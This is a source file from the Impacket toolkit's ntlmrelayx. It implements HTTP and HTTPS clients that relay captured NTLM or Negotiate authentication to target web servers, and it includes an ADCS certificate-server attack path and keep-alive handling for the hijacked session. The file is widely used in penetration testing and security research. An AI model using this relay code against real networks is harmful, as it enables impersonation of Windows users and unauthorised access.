# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies 
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   HTTP Protocol Client
#   HTTP(s) client for relaying NTLMSSP authentication to webservers
#
# Author:
#   Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
#   Alberto Solino (@agsolino)
#
import re
import ssl
try:
    from http.client import HTTPConnection, HTTPSConnection, ResponseNotReady
except ImportError:
    from httplib import HTTPConnection, HTTPSConnection, ResponseNotReady
import base64
from threading import Lock

from struct import unpack
from impacket import LOG
from impacket.examples.ntlmrelayx.clients import ProtocolClient
from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED
from impacket.ntlm import NTLMAuthChallenge
from impacket.spnego import SPNEGO_NegTokenResp

PROTOCOL_CLIENT_CLASSES = ["HTTPRelayClient","HTTPSRelayClient"]

class HTTPRelayClient(ProtocolClient):
    PLUGIN_NAME = "HTTP"

    # Class-level cache: maps (host, port, path) -> requires_auth (True/False)
    # Shared across all instances to remember which paths need authentication
    authCache = {}

    def __init__(self, serverConfig, target, targetPort = 80, extendedSecurity=True ):
        ProtocolClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)
        self.extendedSecurity = extendedSecurity
        self.negotiateMessage = None
        self.authenticateMessageBlob = None
        self.server = None
        self.authenticationMethod = None
        self.anonSession = None  # Anonymous connection for kernel auth workaround
        self.anonLock = Lock()  # Lock for thread-safe anonymous connection access

    def initConnection(self):
        self.session = HTTPConnection(self.targetHost,self.targetPort)
        self.lastresult = None
        if self.target.path == '':
            self.path = '/'
        else:
            self.path = self.target.path
        self.query = self.target.query
        return True

    def sendNegotiate(self,negotiateMessage):
        #Check if server wants auth
        if self.query:
            self.session.request('GET', self.path + '?' + self.query)
        else:
            self.session.request('GET', self.path)
        res = self.session.getresponse()
        res.read()
        if res.status != 401:
            LOG.info('Status code returned: %d. Authentication does not seem required for URL' % res.status)
        try:
            if 'NTLM' not in res.getheader('WWW-Authenticate') and 'Negotiate' not in res.getheader('WWW-Authenticate'):
                LOG.error('NTLM Auth not offered by URL, offered protocols: %s' % res.getheader('WWW-Authenticate'))
                return False
            if 'NTLM' in res.getheader('WWW-Authenticate'):
                self.authenticationMethod = "NTLM"
            elif 'Negotiate' in res.getheader('WWW-Authenticate'):
                self.authenticationMethod = "Negotiate"
        except (KeyError, TypeError):
            LOG.error('No authentication requested by the server for url %s' % self.targetHost)
            if self.serverConfig.isADCSAttack:
                LOG.info('IIS cert server may allow anonymous authentication, sending NTLM auth anyways')
                self.authenticationMethod = "NTLM"
            else:
                return False

        #Negotiate auth
        negotiate = base64.b64encode(negotiateMessage).decode("ascii")
        headers = {'Authorization':'%s %s' % (self.authenticationMethod, negotiate)}
        if self.query:
            self.session.request('GET', self.path + '?' + self.query, headers=headers)
        else:
            self.session.request('GET', self.path, headers=headers)
        res = self.session.getresponse()
        res.read()
        try:
            serverChallengeBase64 = re.search(('%s ([a-zA-Z0-9+/]+={0,2})' % self.authenticationMethod), res.getheader('WWW-Authenticate')).group(1)
            serverChallenge = base64.b64decode(serverChallengeBase64)
            challenge = NTLMAuthChallenge()
            challenge.fromString(serverChallenge)
            return challenge
        except (IndexError, KeyError, AttributeError):
            LOG.error('No NTLM challenge returned from server')
            return False

    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        if unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
            token = respToken2['ResponseToken']
        else:
            token = authenticateMessageBlob
        auth = base64.b64encode(token).decode("ascii")
        headers = {'Authorization':'%s %s' % (self.authenticationMethod, auth)}
        if self.query:
            self.session.request('GET', self.path + '?' + self.query, headers=headers)
        else:
            self.session.request('GET', self.path, headers=headers)
        res = self.session.getresponse()
        if res.status == 401:
            return None, STATUS_ACCESS_DENIED
        else:
            LOG.info('HTTP server returned error code %d, treating as a successful login' % res.status)
            #Cache this
            self.lastresult = res.read()
            return None, STATUS_SUCCESS

    def killConnection(self):
        if self.session is not None:
            self.session.close()
            self.session = None

    def keepAlive(self):
        # Use raw socket operations to keep connection alive
        # IMPORTANT: We avoid session.request() because HTTPConnection can auto-recreate
        # sockets, which would destroy the NTLM-authenticated session. Raw socket ops
        # will simply fail if the socket is dead - they won't auto-recreate anything.
        import threading
        thread_id = threading.current_thread().ident

        try:
            # Check if socket exists
            if self.session.sock is None:
                return

            # Build raw HTTP HEAD request
            head_request = b'HEAD /favicon.ico HTTP/1.1\r\nHost: ' + self.targetHost.encode() + b'\r\nConnection: Keep-Alive\r\n\r\n'

            self.session.sock.send(head_request)

            # Read response (just consume it to keep connection alive)
            response_data = self.session.sock.recv(8192)
            if not response_data:
                LOG.debug('HTTP keepAlive: Thread %s - no data received (connection may be dead)' % thread_id)

        except Exception as e:
            LOG.debug('HTTP keepAlive: Thread %s - Exception occurred: %s' % (thread_id, str(e)))
            # Don't raise the exception - keepAlive failures shouldn't be fatal
            # Don't close/recreate session - NTLM auth is bound to the TCP connection

    def getAnonConnection(self):
        """Get or create anonymous connection for kernel auth workaround"""
        if self.anonSession is None:
            LOG.debug('HTTP: Creating anonymous connection to %s:%s' % (self.targetHost, self.targetPort))
            self.anonSession = HTTPConnection(self.targetHost, self.targetPort)
        return self.anonSession

    def probePathAnonymous(self, path):
        """
        Probe a path anonymously to check if authentication is required.
        Returns: (needs_auth: bool, status_code: int or None)
        """
        # Strip query parameters for caching - /page?a=1 and /page?a=2 should share cache
        path_without_query = path.split('?')[0] if '?' in path else path
        cache_key = (self.targetHost, self.targetPort, path_without_query)

        # Check cache first
        if cache_key in HTTPRelayClient.authCache:
            cached_result = HTTPRelayClient.authCache[cache_key]
            LOG.debug('HTTP: Cache hit for %s - requires_auth=%s' % (path, cached_result))
            return cached_result, None

        # Use lock to prevent concurrent probe attempts on same connection
        with self.anonLock:
            try:
                anon = self.getAnonConnection()
                anon.request('GET', path)
                response = anon.getresponse()
                status = response.status  # Read status before consuming body
                response.read()  # Consume response body

                needs_auth = (status == 401)

                # Close connection to ensure clean state for next probe
                anon.close()
                self.anonSession = None  # Reset so next probe gets fresh connection

                # Cache the result (by path without query params)
                HTTPRelayClient.authCache[cache_key] = needs_auth
                LOG.info('HTTP: Probed %s anonymously - status %d, requires_auth=%s (cached as %s)' % (path, status, needs_auth, path_without_query))

                return needs_auth, status

            except Exception as e:
                LOG.debug('HTTP: Anonymous probe failed for %s: %s' % (path, str(e)))
                # On error, assume auth is needed to be safe
                HTTPRelayClient.authCache[cache_key] = True
                return True, None

class HTTPSRelayClient(HTTPRelayClient):
    PLUGIN_NAME = "HTTPS"

    def __init__(self, serverConfig, target, targetPort = 443, extendedSecurity=True ):
        HTTPRelayClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)

    def initConnection(self):
        self.lastresult = None
        if self.target.path == '':
            self.path = '/'
        else:
            self.path = self.target.path
        self.query = self.target.query
        try:
            uv_context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
            self.session = HTTPSConnection(self.targetHost,self.targetPort, context=uv_context)
        except AttributeError:
            self.session = HTTPSConnection(self.targetHost,self.targetPort)
        return True

    def getAnonConnection(self):
        """Get or create anonymous HTTPS connection for kernel auth workaround"""
        if self.anonSession is None:
            LOG.debug('HTTPS: Creating anonymous connection to %s:%s' % (self.targetHost, self.targetPort))
            try:
                uv_context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
                self.anonSession = HTTPSConnection(self.targetHost, self.targetPort, context=uv_context)
            except AttributeError:
                self.anonSession = HTTPSConnection(self.targetHost, self.targetPort)
        return self.anonSession
